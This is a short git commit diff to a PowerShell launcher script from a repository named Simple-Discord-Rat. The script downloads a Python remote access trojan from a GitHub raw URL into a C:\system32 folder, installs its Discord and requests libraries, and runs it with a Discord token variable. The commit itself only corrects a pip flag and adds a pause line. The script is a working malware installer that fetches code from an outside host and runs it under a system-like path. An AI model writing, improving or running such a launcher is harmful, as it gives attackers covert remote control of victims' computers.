237ecb269da6ba14c79cf25d23a8197cf464745d
Simen <97337442+simen64@users.noreply.github.com>
2023-12-08 18:02:01 +0100

    Update RAT-activator-NoAdmin.ps1

--- Simple-Discord-Rat/RAT-activator-NoAdmin.ps1
+++ Simple-Discord-Rat/RAT-activator-NoAdmin.ps1
@@ -8,6 +8,8 @@ cd C:\system32\
 
 iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-rat.py
 
-py -m pip install discord.py requests -u
+py -m pip install discord.py requests --user
 
 Python sys-rat.py $dc
+
+pause
